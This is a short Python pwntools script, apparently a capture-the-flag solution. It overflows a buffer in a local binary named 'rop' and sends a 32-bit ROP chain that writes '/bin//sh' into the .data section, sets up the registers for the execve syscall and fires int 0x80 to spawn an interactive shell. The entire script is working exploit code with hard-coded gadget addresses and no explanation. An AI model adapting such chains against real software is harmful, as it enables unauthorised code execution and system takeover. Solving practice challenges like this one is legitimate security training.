from pwn import *
from struct import pack
context(log_level = 'debug')
io = process("./rop")
elf = ELF("./rop")

payload = 'a'*(0xc+0x4)

payload += pack('<I', 0x0806ecda) # pop edx ; ret
payload += pack('<I', 0x080ea060) # @ .data
payload += pack('<I', 0x080b8016) # pop eax ; ret
payload += '/bin'
payload += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ecda) # pop edx ; ret
payload += pack('<I', 0x080ea064) # @ .data + 4
payload += pack('<I', 0x080b8016) # pop eax ; ret
payload += '//sh'
payload += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ecda) # pop edx ; ret
payload += pack('<I', 0x080ea068) # @ .data + 8
payload += pack('<I', 0x080492d3) # xor eax, eax ; ret
payload += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080481c9) # pop ebx ; ret
payload += pack('<I', 0x080ea060) # @ .data
payload += pack('<I', 0x080de769) # pop ecx ; ret
payload += pack('<I', 0x080ea068) # @ .data + 8
payload += pack('<I', 0x0806ecda) # pop edx ; ret
payload += pack('<I', 0x080ea068) # @ .data + 8
payload += pack('<I', 0x080492d3) # xor eax, eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0806c943) # int 0x80
io.sendline(payload)
io.interactive()